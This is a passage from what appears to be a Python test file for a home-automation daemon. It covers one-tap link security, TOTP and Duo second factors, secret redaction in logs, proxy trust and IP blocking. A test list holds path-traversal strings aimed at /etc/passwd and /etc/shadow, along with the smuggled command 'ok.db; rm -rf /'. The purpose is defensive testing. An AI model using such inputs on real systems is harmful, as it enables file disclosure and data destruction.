#!/usr/bin/env python3
"""The two roads a one-tap link may be opened by, and the code on the second.

A link's secret used to travel in the address, where a web server log, a
proxy, a browser history and the robot that fetches a link preview all keep a
copy - and that last one physically presses the link when the address is
pasted into a message. The header road puts the same secret in a header of a
POST, where none of them can see it, and a six-digit code from a phone can be
asked for on top.

Nothing here needs a broker or a web server.

    ZIGMON_CONFIG=/tmp/zt.json PYTHONPATH=. python3 test/taps.py
"""
import json
from pathlib import Path as _Path
import re
import sys
import time
import time as _time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
sys.argv = ['zigmon']
import zigmon                                            # noqa: E402

zigmon.load_config()
zigmon.CONFIG['db_file'] = '/tmp/zigmon-taps-check.db'
# A stale journal beside a fresh database is not this run's data: SQLite
# replays it, and a check then fails over rows the run never wrote. Both
# sidecars go with the file.
import os as _dbclean
for _ext in ('', '-wal', '-shm'):
    try:
        _dbclean.remove(zigmon.CONFIG['db_file'] + _ext)
    except OSError:
        pass

zigmon.CONFIG['api_port'] = 19701
zigmon.CONFIG['token_file'] = '/tmp/zigmon-taps-token'
Path(zigmon.CONFIG['db_file']).unlink(missing_ok=True)
d = zigmon.Daemon()

# -- the maths, against the examples in RFC 6238 ------------------------------
RFC = 'GEZDGNBVGY3TQOJQGEZDGNBVGY3TQOJQ'
for when, want in ((59, '287082'), (1111111109, '081804'),
                   (1234567890, '005924'), (2000000000, '279037')):
    got = zigmon.totp_at(RFC, when // zigmon.TOTP_STEP)
    assert got == want, 'RFC 6238 at %d gave %s, wanted %s' % (when, got, want)
print('TOTP: four test vectors from RFC 6238, all four right')

# -- which road is open -------------------------------------------------------
d.save_taps([{'name': 'Lamp', 'target': 'notify', 'do': 'on'}])
token = d.taps()[0]['token']


def opened(way, code='', ask=False):
    ok, answer = d.tap(token, '1.2.3.4', ask=ask, way=way, code=code)
    return ok, (answer if isinstance(answer, str) else dict(answer))


for mode, by_link, by_header in (('link', True, False), ('both', True, True), ('header', False, True)):
    zigmon.CONFIG['tap_mode'] = mode
    assert opened('link')[0] is by_link, '%s: the address should be %s' % (mode, 'open' if by_link else 'shut')
    assert opened('header')[0] is by_header, '%s: the header should be %s' % (mode, 'open' if by_header else 'shut')
    print('%-6s address %-7s header %s' % (mode, 'opens' if by_link else 'refused',
                                           'opens' if by_header else 'refused'))

def outward(answer):
    """What the phone is actually sent, whichever shape came back inside."""
    if isinstance(answer, dict):
        return int(answer.get('status') or 403), answer.get('error')
    return 404, answer


# A road that is shut must answer word for word what an address that does not
# exist answers, or an old log tells whoever reads it that its link is real.
zigmon.CONFIG['tap_mode'] = 'header'
assert outward(opened('link')[1]) == outward(d.tap('not-a-real-token', '1.2.3.4')[1]), \
    'a shut road gives itself away by answering differently from an unknown link'
print('a shut road answers exactly as an unknown link does')

# A shut road is not somebody guessing. The secret was right; this is a
# shortcut that has not been changed over. Counted as a wrong try, ten presses
# of a watch face nobody has rewritten shut the links for a minute - taking
# the new shortcut down with them - and each one cost a second of a web
# server worker.
for _ in range(20):
    ok, answer = opened('link')
    assert not ok
    assert isinstance(answer, dict) and answer['status'] == 404, \
        'an old-style press is counted as a guess: %r' % (answer,)
assert d.tap_may_try('1.2.3.4'), 'twenty presses of an old shortcut shut the links'
was = time.time()
opened('link')
assert time.time() - was < 0.2, 'an old-style press is still made to wait'
print('an old shortcut is refused the same way, and costs nothing')

# -- the code -----------------------------------------------------------------
d.save_tap_keys([{'name': 'Falco iPhone'}])
secret = d.tap_keys()[0]['secret']
zigmon.CONFIG['tap_code'] = 1
assert d.tap_code_wanted()

ok, answer = opened('header')
assert not ok and answer['status'] == 403, 'a header with no code was let through'
ok, answer = opened('header', code='000000')
assert not ok and answer['status'] == 403, 'six wrong digits were let through'

def code_from(steps_back=0):
    # read the clock for each one: a window that turns over between two lines
    # of this test would otherwise make it fail for no reason
    return zigmon.totp_at(secret, int(time.time() // zigmon.TOTP_STEP) - steps_back)


assert opened('header', code=code_from())[0], 'the code showing now was refused'
# A code is good while its own window is open - somebody in a doorway presses
# twice - and refused for ever after, which is what makes a secret read out of
# a log next week worth nothing.
assert opened('header', code=code_from())[0], 'the second press inside the same code was refused'
assert opened('header', code=code_from(1))[0], 'a clock a step slow was refused'
assert not opened('header', code=code_from(3))[0], 'a code a minute and a half old was taken'
assert not opened('header', code=code_from(20160))[0], 'a code from a week ago was taken'
print('the code: this window and one either side, and nothing older')

# asking how things stand touches nothing and needs no code
assert opened('header', ask=True)[0], 'asking was refused'

# -- a new secret for the same phone -----------------------------------------
# A secret seen by the wrong person is replaced, not the phone taken away:
# taking it away would be a second decision - about which links it may open -
# that nobody asked to make.
was = d.tap_keys()[0]['secret']
kept = d.tap_keys()[0]['id']
fresh = zigmon.totp_secret()
d.store.set_meta('tap_keys', __import__('json').dumps(
    [dict(k, secret=fresh) if k['id'] == kept else k for k in d.tap_keys()]))
assert d.tap_keys()[0]['id'] == kept, 'rolling the secret changed which phone it is'
assert d.tap_keys()[0]['name'] == 'Falco iPhone', 'rolling the secret lost the name'
assert not d.tap_key_for(zigmon.totp_at(was, int(time.time() // zigmon.TOTP_STEP))), \
    'the old secret still opens things'
assert d.tap_key_for(zigmon.totp_at(fresh, int(time.time() // zigmon.TOTP_STEP))), \
    'the new secret does not open anything'
secret = fresh
print('a phone can be given a new secret without losing its name or its links')

# -- the wait before reading a socket back ------------------------------------
# Only where there is a socket to read. A link on a notification, on heating,
# on a Zigbee switch or on a sequence has nothing to come back for, and the
# third of a second was spent on the wrist for nothing at every press.
zigmon.CONFIG['tap_code'] = 0
started = time.time()
assert opened('header')[0], 'the press was refused'
spent = time.time() - started
assert spent < 0.1, 'a link with nothing to read back still waits %.2f s' % spent
print('a press with nothing to read back answers at once (%.0f ms)' % (spent * 1000))

# and where there IS a socket, the wait is still taken and the state is read
# twice: once to see whether it is worth waiting for, once for the answer
reads = []
real_state = d.tap_state


def counted(targets):
    reads.append(time.time())
    return 'on', 'on'                 # as a socket would answer


d.tap_state = counted
started = time.time()
assert opened('header')[0]
spent = time.time() - started
d.tap_state = real_state
assert len(reads) == 2, 'the state was read %d time(s), wanted twice' % len(reads)
assert 0.3 < spent < 0.6, 'a socket was not given its moment to answer (%.2f s)' % spent
print('a press on a socket still waits for it (%.0f ms)' % (spent * 1000))
zigmon.CONFIG['tap_code'] = 1

# -- the other second factor: Duo approves it --------------------------------
# The watch cannot make a six-digit code, so the code has to be finished on
# the phone. Duo asks the person instead and has a watch app of its own, so
# the press is approved where it was made. Nothing about it is asked of the
# shortcut beyond coming back for the answer.
zigmon.CONFIG['tap_mode'] = 'header'
zigmon.CONFIG['tap_code'] = 1
zigmon.CONFIG['tap_factor'] = 'duo'
for key in ('duo_host', 'duo_ikey', 'duo_skey', 'duo_user'):
    zigmon.CONFIG[key] = ''
ok, answer = opened('header')
assert not ok and answer['status'] == 503, 'a link asked Duo while Duo was not set up'
zigmon.CONFIG.update({'duo_host': 'api-test.duosecurity.com', 'duo_ikey': 'DI', 'duo_skey': 's',
                      'duo_user': 'somebody'})

asked = []


def _yes(what, who=''):
    asked.append(what)
    time.sleep(0.3)
    return True, 'approved'


d.duo_push = _yes
ok, answer = opened('header')
assert ok and answer['state'] == 'waiting' and answer.get('ticket'), \
    'the press did not come back with a ticket: %r' % (answer,)
ticket = answer['ticket']
got, state = d.tap_waiting(ticket, 5)
assert got and state['state'] == 'done', 'an approved press did not happen: %r' % (state,)
assert asked and 'notification' in asked[0], 'Duo was not told what it was approving: %r' % (asked,)
# asking again says the same thing rather than doing it twice
again = d.tap_waiting(ticket, 1)
assert again[1]['state'] == 'done'
d.duo_push = lambda what, who='': (False, 'denied')
ok, answer = opened('header')
assert d.tap_waiting(answer['ticket'], 5)[1]['state'] == 'refused', 'a refused press was let through'
assert d.tap_waiting('not-a-ticket', 1)[1]['status'] == 404, 'a ticket nobody made was answered'
print('Duo: a press waits to be approved, and happens only if it is')

# The signature Duo checks. Two ways of writing the canonical form are in use
# - the one the Auth API documents and the one the published client defaults
# to - and an account takes one and calls the other "Invalid signature in
# request credentials", which says nothing about which. Both are written out,
# so both must keep their shape.
_when = 'Tue, 21 Aug 2012 17:25:06 -0700'
_ikey, _skey = 'DIWJ8X6AEYOR5OMC6TQ1', 'Zh5eGmUq9zpfQnyUIu5OL9iWoMMv5ZNmk3zLJ4Ep'
_params = {'factor': 'push', 'username': 'somebody'}
_shapes = set()
for _v, _d in zigmon.DUO_WAYS:
    _one = zigmon.duo_sign(_ikey, _skey, 'POST', 'api-XXXXXXXX.duosecurity.com', '/auth/v2/auth',
                           _when, _params, _v, _d)
    assert _one.startswith('Basic '), 'v%s %s is not an Authorization header' % (_v, _d)
    assert _one == zigmon.duo_sign(_ikey, _skey, 'POST', 'api-XXXXXXXX.duosecurity.com',
                                   '/auth/v2/auth', _when, _params, _v, _d), \
        'v%s %s signed the same request two ways' % (_v, _d)
    assert _one != zigmon.duo_sign(_ikey, _skey, 'POST', 'api-XXXXXXXX.duosecurity.com',
                                   '/auth/v2/auth', _when, {'factor': 'push', 'username': 'else'}, _v, _d), \
        'v%s %s does not sign the parameters' % (_v, _d)
    _shapes.add(_one)
assert len(_shapes) == len(zigmon.DUO_WAYS), 'two ways of signing give the same answer, so one is wrong'
print('Duo: all %d ways of signing keep their shape, and differ from each other' % len(zigmon.DUO_WAYS))

# And which way an account takes is found out rather than assumed: four ways
# of signing are in use between the versions of the canonical form and the two
# digests, and an account takes one and calls the other three a bad signature
# without saying which. Each is tried in turn and the one that answers is
# written down.
_tried = []


def _only_sha1(method, path, params, host, version, digest, timeout):
    _tried.append('%s:%s' % (version, digest))
    if (version, digest) != ('2', 'sha1'):
        raise ValueError('Invalid signature in request credentials')
    return {'time': 1}


zigmon.CONFIG.update({'duo_host': 'api-x.duosecurity.com', 'duo_ikey': 'DI', 'duo_skey': 'sk'})
d.duo_lib = lambda timeout=20: None        # the machine without Duo's own package
d._duo_once = _only_sha1
d.duo_call('GET', '/auth/v2/check', {})
assert _tried == ['2:sha512', '2:sha1'], 'it did not walk the ways in order: %r' % (_tried,)
_tried.clear()
d.duo_call('GET', '/auth/v2/check', {})
assert _tried == ['2:sha1'], 'it asked all over again instead of remembering: %r' % (_tried,)
assert d.store.get_meta('duo_way') == '2:sha1', 'the way that worked was not written down'
print('Duo: the way of signing is found once and then remembered')

# Duo's own package is the reference for every detail of the signing, so it is
# used wherever the machine has it, and what is written out here is only for a
# machine that has not.
_lib_tried = []
d._duo_way = None
d.store.set_meta('duo_way', '')


class _PretendLib(object):
    def json_api_call(self, method, path, params):
        _lib_tried.append(path)
        return {'time': 1}


d.duo_lib = lambda timeout=20: _PretendLib()
assert d.duo_call('GET', '/auth/v2/check', {}) == {'time': 1}
assert _lib_tried == ['/auth/v2/check'], 'the package was there and was not used'
_tried.clear()
assert not _tried, 'it signed for itself while the package was answering'
d.duo_lib = lambda timeout=20: None
d.duo_call('GET', '/auth/v2/check', {})
assert _tried, 'without the package it did not sign for itself'
print('Duo: the package is used where it is installed, and not needed where it is not')

# What the endpoint answers is a `result` - waiting, allow or deny. The
# published client's own auth_status() turns that into `waiting` and
# `success`, and this asks the endpoint directly, so it gets neither: reading
# those off the raw answer made every press refused a fifth of a second after
# it was made, before the phone had finished buzzing.
d.duo_push = zigmon.Daemon.duo_push.__get__(d)     # the real one again, not the stub above
_answers = []


def _push_then(*seq):
    _answers[:] = list(seq)

    def call(method, path, params, timeout=20):
        if path.endswith('/auth'):
            return {'txid': 't-1'}
        return _answers.pop(0) if _answers else {'result': 'waiting'}
    d.duo_call = call


_push_then({'result': 'waiting', 'status': 'pushed'}, {'result': 'allow', 'status_msg': 'Approved'})
assert d.duo_push('a lamp') == (True, 'Approved'), 'a press waiting on the phone was called refused'
_push_then({'result': 'deny', 'status_msg': 'Login request denied.'})
assert d.duo_push('a lamp')[0] is False, 'a refused press was let through'
# and the shape the package's own auth_status() hands back is read too
_push_then({'waiting': True}, {'waiting': False, 'success': True, 'status_msg': 'ok'})
assert d.duo_push('a lamp') == (True, 'ok'), 'the package\u2019s own shape was misread'
print('Duo: a press waits while Duo says it is waiting, and only then is it answered')

# An account with three devices cannot be asked to guess which one Duo's own
# "auto" will pick - it is as likely to be the iPad on a shelf as the phone in
# a pocket. What preauth says is kept, so the dashboard can offer the list,
# and the one chosen is what the press is addressed to.
_pre = {'result': 'auth', 'devices': [
    {'device': 'DP111', 'display_name': 'iPad 2019', 'capabilities': ['auto', 'push']},
    {'device': 'DP333', 'display_name': 'iPhone16', 'capabilities': ['auto', 'push', 'sms']}]}
d.duo_call = lambda m, p, params, timeout=20: {} if p.endswith('check') else _pre
assert d.duo_check()[0], 'the test refused an account that can take a push'
assert [x['device'] for x in d.duo_devices()] == ['DP111', 'DP333'], 'the devices were not kept'
assert [x['name'] for x in d.status()['duo_devices']] == ['iPad 2019', 'iPhone16'], \
    'the dashboard is not told what it may choose between'
d.save_config_overrides({'duo_device': 'DP333'})
_sent = {}


def _watch(m, p, params, timeout=20):
    if p.endswith('/auth'):
        _sent.update(params)
        return {'txid': 't'}
    return {'result': 'allow', 'status_msg': 'ok'}


d.duo_call = _watch
d.duo_push('a lamp')
assert _sent.get('device') == 'DP333', 'the press was not addressed to the chosen device: %r' % (_sent,)
zigmon.CONFIG['duo_device'] = 'auto'
d.duo_push('a lamp')
assert _sent.get('device') == 'auto', 'auto stopped meaning auto'
print('Duo: the press goes to the device that was chosen, not the one Duo would pick')

# A press that has to be approved is answered when it is approved, not with a
# ticket to come back for: coming back is three more actions in a shortcut,
# and a person standing at a door is waiting either way.
zigmon.CONFIG['tap_mode'] = 'header'
zigmon.CONFIG['tap_code'] = 1
zigmon.CONFIG['tap_factor'] = 'duo'
zigmon.CONFIG['duo_wait_s'] = 10
d.duo_push = lambda what, who='': (time.sleep(0.4) or (True, 'approved'))
_started = time.time()
_ok, _answer = d.tap(token, '1.2.3.4', way='header')
assert _ok and _answer.get('ticket'), 'the press did not start'
_ok, _answer = d.tap_waiting(_answer['ticket'], 5)
assert _ok and _answer['state'] == 'done', 'waiting on the ticket did not give the outcome'
assert time.time() - _started >= 0.4, 'it answered before the approval could arrive'
print('Duo: the outcome can be waited for on the one request that made it')

# A key pasted from a web page brings a space or a newline with it more often
# than not, and Duo refuses a key with one stuck to it in exactly the words it
# refuses a wrong key with.
d.save_config_overrides({'duo_host': ' api-x.duosecurity.com \n', 'duo_ikey': ' DI ',
                         'duo_skey': 'SK\n', 'duo_user': ' falco '})
for _k, _want in (('duo_host', 'api-x.duosecurity.com'), ('duo_ikey', 'DI'),
                  ('duo_skey', 'SK'), ('duo_user', 'falco')):
    assert zigmon.CONFIG[_k] == _want, '%s was stored as %r' % (_k, zigmon.CONFIG[_k])
print('Duo: what is pasted in is stored without the whitespace around it')

# Nothing is thrown away by choosing one factor over the other.
_before = [k['secret'] for k in d.tap_keys()]
zigmon.CONFIG['tap_factor'] = 'totp'
assert [k['secret'] for k in d.tap_keys()] == _before, 'the phones lost their secrets'
zigmon.CONFIG['tap_factor'] = 'duo'
assert str(zigmon.CONFIG['duo_ikey']), 'the Duo keys were lost'
zigmon.CONFIG['tap_factor'] = 'totp'
zigmon.CONFIG['tap_code'] = 1
assert opened('header', code=code_from())[0], 'a code stopped working after a turn through Duo'
print('both factors keep what is theirs, whichever is chosen')

# -- what the dashboard may see ----------------------------------------------
state = d.status()
assert secret not in repr(state), 'a code secret went out with the status'
assert [k.get('secret') for k in state['tap_keys']] == [None], 'the phones went out with their secrets'
assert all('secret' not in k for k in state['tap_keys'])
print('the phones go out by name; the secrets stay in the daemon')

# Choosing a factor and demanding one are two decisions. Refusing both at once
# made the choice impossible to make: Duo's boxes are not asked for until Duo
# is the factor, and Duo could not be made the factor until its boxes were
# filled in - so there was nowhere to type them. The choice stands; the demand
# is what gives way, and says so.
zigmon.CONFIG['tap_mode'] = 'header'
for _k in ('duo_host', 'duo_ikey', 'duo_skey', 'duo_user'):
    zigmon.CONFIG[_k] = ''
d.save_config_overrides({'tap_factor': 'duo', 'tap_code': 1})
assert zigmon.CONFIG['tap_factor'] == 'duo', 'Duo could not be chosen before it was set up'
assert not zigmon.CONFIG['tap_code'], 'a factor nothing can answer was left demanded'
assert 'Duo' in (d.last_config_note or ''), 'nothing was said about why it was switched off'
d.save_config_overrides({'duo_host': 'api-x.duosecurity.com', 'duo_ikey': 'DI',
                         'duo_skey': 'sk', 'duo_user': 'falco'})
d.save_config_overrides({'tap_code': 1})
assert zigmon.CONFIG['tap_code'] and not d.last_config_note, 'it could not be switched on once Duo was set up'
print('Duo can be chosen first and filled in afterwards, which is the only order there is')

# -- the switch that would lock everybody out --------------------------------
zigmon.CONFIG['tap_mode'] = 'link'
zigmon.CONFIG['tap_code'] = 0
zigmon.CONFIG['tap_factor'] = 'totp'
d.store.set_meta('tap_keys', '[]')
d.save_config_overrides({'tap_code': 1, 'tap_mode': 'header'})
assert not zigmon.CONFIG.get('tap_code'), 'a code was demanded with no phone to show one'
assert 'phone' in (d.last_config_note or ''), 'nothing was said about why'
print('a code with no phone to show one is not demanded, and it is said why')


# -- and what this daemon writes down about it --------------------------------
# A secret in an address is a secret in the log. The header road exists
# because a URL is written down everywhere it goes, and the daemon's own debug
# log was one of those places: a link opened by its address went in whole.
# Enough is left to tell two links apart and no more.
_hide = zigmon.ApiHandler.hide_secrets
_line = _hide('"GET /api/tap/%s HTTP/1.1" 200 -' % token)
assert token not in _line, 'a link secret is still written into the log: %s' % _line
assert token[-4:] in _line, 'nothing is left to tell one link from another: %s' % _line
assert 'my-push-word' not in _hide('"GET /index.php?api=sms-incoming&secret=my-push-word HTTP/1.1"'), \
    'the word a forwarded message carries is still written down'
assert token not in _hide('"GET /index.php?t=%s&ask HTTP/1.1" 200 -' % token), \
    'the older address form is still written down whole'
assert _hide('"GET /api/status HTTP/1.1" 200 -') == '"GET /api/status HTTP/1.1" 200 -', \
    'an ordinary line was changed'
assert '{plugs_on_list.nl}' in _hide('"GET /api/message-preview?text={plugs_on_list.nl}"'), \
    'something that is not a secret was blotted out'
print('a secret in an address does not reach the log')

# Behind a server of its own, every press arrives from that server. What it
# says the caller was is worth showing - the proxy's address on every line
# tells nobody anything - but it is a claim, not proof, since anyone may send
# that header. It is shown as a claim, and guesses are counted against the
# address the request really came from, or a guesser would pick a new claim
# per try and the counter would never fill.


class _Pretend(object):
    def __init__(self, headers):
        self.headers = headers
        self.client_address = ('127.0.0.1', 1)
        self.daemon = d
    _who = zigmon.ApiHandler._who
    _caller = zigmon.ApiHandler._caller


assert _Pretend({'X-Zigmon-Client': '10.8.0.1'})._who() == '10.8.0.1'
_said = _Pretend({'X-Zigmon-Client': '10.8.0.1', 'X-Zigmon-Via': '89.24.5.7, 10.8.0.1'})._who()
assert _said == '10.8.0.1 (says 89.24.5.7)', 'a claim is not shown as a claim: %r' % _said
assert _Pretend({'X-Zigmon-Client': '10.8.0.1', 'X-Zigmon-Via': '89.24.5.7'})._caller() == '10.8.0.1', \
    'the counting would be done against a claim from an unnamed proxy'
assert _Pretend({'X-Zigmon-Client': '1.2.3.4', 'X-Zigmon-Via': '1.2.3.4'})._who() == '1.2.3.4', \
    'a proxy that agrees with itself is said twice'
print('a caller a proxy claims is shown as a claim, and never counted as one')

# ...and the debug log says both, since everything arrives over the loopback
# from the relay and the line named nobody at all: an arrow where the claim is
# believed, "says" where it is not.
_lines = []
_was_log = zigmon.log
zigmon.log = lambda text, level='info', **k: _lines.append(str(text))
try:
    _pretend = _Pretend({'X-Zigmon-Client': '192.168.43.17', 'X-Zigmon-Via': '89.24.5.7'})
    _pretend.hide_secrets = lambda text: text      # its own guard is checked elsewhere
    _pretend.log_message = zigmon.ApiHandler.log_message.__get__(_pretend)
    zigmon.CONFIG['trusted_proxies'] = '192.168.43.17'
    _pretend.log_message('%s', '"POST /api/tap" 200')
    zigmon.CONFIG['trusted_proxies'] = ''
    _pretend.log_message('%s', '"POST /api/tap" 200')
finally:
    zigmon.log = _was_log
assert '192.168.43.17 \u2192 89.24.5.7' in _lines[0], 'the believed claim is not shown: %r' % _lines[0]
assert '192.168.43.17 says 89.24.5.7' in _lines[1], 'an unbelieved claim is not shown as one: %r' % _lines[1]
print('the log names the server that carried a press and the address it says pressed')

# And with debug on, every header a request carried - behind a server of its
# own, what arrived is the only way to tell a thing that was sent from a thing
# that was dropped on the way. A header whose value is the thing itself is
# shown as its last few letters, so the log can be read without being worth
# stealing.
_lines = []
_was_log = zigmon.log
zigmon.log = lambda text, level='info', **k: _lines.append(str(text))
try:
    _pretend = _Pretend({'X-Zigmon-Tap': 'a-very-long-secret-1234',
                         'X-Zigmon-Code': '123456',
                         'X-Zigmon-Arg-Ip': '1.2.3.4',
                         'User-Agent': 'BackgroundShortcutRunner/4711'})
    _pretend.SECRET_HEADERS = zigmon.ApiHandler.SECRET_HEADERS
    _pretend.log_headers = zigmon.ApiHandler.log_headers.__get__(_pretend)
    _pretend.log_headers()
finally:
    zigmon.log = _was_log
_said = _lines[0]
assert 'X-Zigmon-Arg-Ip: 1.2.3.4' in _said, 'an ordinary header is not shown: %r' % _said
assert 'BackgroundShortcutRunner' in _said, 'the agent is not shown'
assert 'a-very-long-secret-1234' not in _said, 'a link secret is written out in full: %r' % _said
assert '1234' in _said, 'a secret is not shown by its last letters at all'
assert '123456' not in _said, 'a six-digit code is written out in full'
print('the debug log shows every header, with the ones that are secrets shortened')

# and on every road, not only the API: a push arriving, a call out to a plug,
# and the answer it gives back
assert 'Authorization: \u2026cafe' in zigmon.header_line(
    {'Content-Type': 'application/json', 'Authorization': 'Digest user=admin response=deadbeefcafe'}), \
    'an outgoing Authorization is written out in full'
assert 'WWW-Authenticate: \u20265678' in zigmon.header_line(
    {'WWW-Authenticate': 'Digest realm=shelly nonce=12345678'}), \
    'what a plug answers with is written out in full'
assert 'User-Agent: ntfy' in zigmon.header_line({'User-Agent': 'ntfy'}), 'an ordinary header is hidden'
_src = open(str(__file__).rsplit('/', 2)[0] + '/zigmon.py').read()
for _road in ('api    headers', 'push    headers', 'http    headers'):
    assert _road in _src, 'the %s road shows no headers in debug' % _road.split()[0]
print('the API, a push arriving and a call out to a plug all show their headers')

# ...and whole, when the house asks for whole: debugging the very path that
# carries a secret is exactly when the shortening is in the way.
zigmon.CONFIG['debug_secrets'] = 0
assert 'a-very-long-secret-1234' not in zigmon.header_line({'X-Zigmon-Tap': 'a-very-long-secret-1234'})
zigmon.CONFIG['debug_secrets'] = 1
assert 'a-very-long-secret-1234' in zigmon.header_line({'X-Zigmon-Tap': 'a-very-long-secret-1234'}), \
    'debug_secrets does not show a secret whole'
assert '123456' in zigmon.header_line({'X-Zigmon-Code': '123456'}), 'a code is still hidden'
_path = '/api/tap/a-very-long-secret-1234'
assert zigmon.ApiHandler.hide_secrets(_path) == _path, 'a secret in the path is still blotted'
zigmon.CONFIG['debug_secrets'] = 0
assert zigmon.ApiHandler.hide_secrets(_path) != _path, \
    'with it off, a secret in the path is written out'
print('debug_secrets shows them whole, and hides them again when it is off')

# and with it off, an address carrying a session or a PIN is blotted: the page
# puts a session on every request it makes
zigmon.CONFIG['debug_secrets'] = 0
for _name, _value in (('session', 'Xq8aS69EgFMqSQby-MzmnpDJctlLrcvG'), ('pin', '4321')):
    _line = '"GET /api/status?%s=%s HTTP/1.1" 200' % (_name, _value)
    assert _value not in zigmon.ApiHandler.hide_secrets(_line), \
        'a %s in an address is written out: %r' % (_name, zigmon.ApiHandler.hide_secrets(_line))
print('a session or a PIN in an address is blotted in the log')

# With debug_secrets on, the house has asked for everything open: the headers
# whole, the addresses whole, a body not cut off where the thing being looked
# for tends to be, and what Duo answered as it answered it.
zigmon.CONFIG['debug_secrets'] = 1
assert len(zigmon.debug_cut('x' * 600)) == 600, 'a body is still cut short'
assert 'deadbeefcafe' in zigmon.header_line({'Authorization': 'Digest response=deadbeefcafe'})
assert 'SECRET' in zigmon.Daemon.duo_gist({'result': 'allow', 'signature': 'SECRET'}), \
    'what Duo answered is still summarised'
zigmon.CONFIG['debug_secrets'] = 0
assert len(zigmon.debug_cut('x' * 600)) == 400, 'with it off a body is not shortened'
assert 'SECRET' not in zigmon.Daemon.duo_gist({'result': 'allow', 'signature': 'SECRET'}), \
    'with it off a Duo answer carries a secret'
print('debug_secrets opens the headers, the addresses, the bodies and what Duo said')

# The names of stored files come from outside. None of them may name a place
# outside the folder they belong in.
_bad = ['../../../../etc/passwd', '/etc/shadow', 'a/../../../tmp/x', 'ok.db; rm -rf /',
        '..%2f..%2fetc%2fpasswd', 'x' * 300, '\x00etc/passwd', '....//....//etc/passwd',
        'zigmon-db-../../evil.sqlite', 'zigmon-db-x.sqlite/../../../evil']
for _nm in _bad:
    try:
        _p = d.db_backup_path(_nm)
        raise AssertionError('a backup name reached %s' % _p)
    except ValueError:
        pass
_made = re.sub(r'[^0-9A-Za-z._-]', '-', '../../../../etc/passwd')
assert '/' not in _made, 'a separator survived the sanitising'
print('%d hostile file names, none of them naming a place outside the folder' % len(_bad))

# A copy of the house is the same house: the same settings, the same links,
# the same phones. And a file that opens a garage is not made by somebody who
# meant to keep a copy of their layout - the secrets go in only when asked
# for, and without them the restore still works, with fresh ones.
zigmon.CONFIG['tap_mode'] = 'header'
d.save_config_overrides({'tap_mode': 'header', 'tap_factor': 'duo', 'duo_user': 'somebody',
                         'duo_skey': 'THESECRETKEY'})
_plain = json.dumps(d.export_settings())
_full = json.dumps(d.export_settings(secrets=True))
_token = d.taps()[0]['token']
_phone = d.tap_keys()[0]['secret'] if d.tap_keys() else ''
for _secret in [x for x in ('THESECRETKEY', _token, _phone) if x]:
    assert _secret not in _plain, 'a secret is in the ordinary export'
    assert _secret in _full, 'a secret is missing from the one that asked for them'
for _key in ('settings', 'taps', 'tap_keys'):
    assert _key in json.loads(_plain), 'an export without %s is not a copy of the house' % _key
assert json.loads(_plain)['settings'].get('tap_factor') == 'duo', 'Settings are not carried'
assert json.loads(_full)['holds_secrets'] and not json.loads(_plain)['holds_secrets']
print('an export is a copy of the house, and holds no secret unless it is asked for')

# ---- addresses that behave like somebody trying things ----------------------
zigmon.CONFIG.update({'block_mode': 'temporary', 'block_minutes': 30, 'block_score': 15,
                      'block_private': 'never', 'trusted_proxies': ''})
d.store.unblock()
# with "never", the house is left alone whatever it does
for _i in range(9):
    d.note_anomaly('192.168.40.170', 'bad-secret', 'link %d' % _i)
assert d.store.blocked_until('192.168.40.170') is None, 'the house blocked itself'
# three wrong secrets from outside is a block, and it runs out. They are the
# same secret here, so they are made far enough apart to be three tries rather
# than one browser asking three times.
for _i in range(3):
    zigmon.Daemon.SAME_TRY_WITHIN = 0
    d.note_anomaly('89.24.5.7', 'bad-secret', 'Garaz')
zigmon.Daemon.SAME_TRY_WITHIN = 2.0
_until = d.store.blocked_until('89.24.5.7')
assert _until and _until > time.time(), 'three wrong secrets were let by'
# a wrong secret is serious, so it lasts four times the ordinary length
assert 115 * 60 < _until - time.time() <= 120 * 60, 'the block does not last what it was told to'
# looking around costs more than mistyping: different links add to the weight
d.store.unblock()
for _i in range(2):
    d.note_anomaly('89.24.5.8', 'bad-code', 'one link')
assert d.store.blocked_until('89.24.5.8') is None, 'two wrong codes on one link is a block'
for _i in range(4):
    d.note_anomaly('89.24.5.9', 'bad-secret', 'link %d' % _i)
assert d.store.blocked_until('89.24.5.9') is not None, 'somebody trying four links was let by'
# off means off, permanent means permanent
zigmon.CONFIG['block_mode'] = 'off'
for _i in range(9):
    d.note_anomaly('89.24.6.1', 'bad-secret', 'link %d' % _i)
assert d.store.blocked_until('89.24.6.1') is None, 'it blocked somebody while switched off'
zigmon.CONFIG['block_mode'] = 'permanent'
for _i in range(4):
    d.note_anomaly('89.24.6.2', 'bad-secret', 'link %d' % _i)
assert d.store.blocked_until('89.24.6.2') == 0, 'a permanent block is not permanent'
# one that has run out is not a block
d.store.block('89.24.7.1', time.time() - 1, 'old')
assert d.store.blocked_until('89.24.7.1') is None, 'an expired block still shuts somebody out'
# by hand, and off again
d.store.block('89.24.8.1', None, 'by hand', auto=False, by='me')
assert d.store.blocked_until('89.24.8.1') == 0
assert d.store.unblock('89.24.8.1') == 1 and d.store.blocked_until('89.24.8.1') is None
# and it keeps, because it is in the database rather than in memory
assert any(r['ip'] == '89.24.6.2' for r in zigmon.Daemon.blocked_list(d)), 'the list is not kept'
print('%d address(es) on the list, blocked by weight and not by counting' % len(d.blocked_list()))

# A claim is believed only from a server that was named as one; from anybody
# else the address they really came from is what counts, or a guesser picks a
# new claim per try and is never blocked at all.
assert d.caller_of('10.8.0.1', '89.24.5.7') == '10.8.0.1', 'an unnamed proxy was believed'
zigmon.CONFIG['trusted_proxies'] = '10.8.0.0/24, 172.16.0.5'
assert d.caller_of('10.8.0.1', '89.24.5.7, 10.8.0.1') == '89.24.5.7', 'a named proxy was not believed'
assert d.caller_of('172.16.0.5', '89.24.5.7') == '89.24.5.7'
assert d.caller_of('89.24.9.9', '1.2.3.4') == '89.24.9.9', 'a stranger claiming to be a proxy'
zigmon.CONFIG['trusted_proxies'] = ''
print('a forwarded address is believed only from a server that was named as one')

# the same list, as a firewall takes it
d.store.block('89.24.9.1', time.time() + 600, 'for the firewall', auto=True)
_lines = d.blocked_mikrotik()
assert any('address=89.24.9.1' in x and 'timeout=' in x for x in _lines), 'no line for the firewall'
assert any('address-list add list=zigmon' in x for x in _lines)
print('%d line(s) a Mikrotik would take, timeouts and all' % len(_lines))

# ---- and carried to the router itself --------------------------------------
# One address list, and inside it only what this put there. A list somebody
# keeps by hand under the same name keeps every entry they made.
zigmon.CONFIG.update({'mikrotik_host': '192.168.40.1', 'mikrotik_list': 'zigmon',
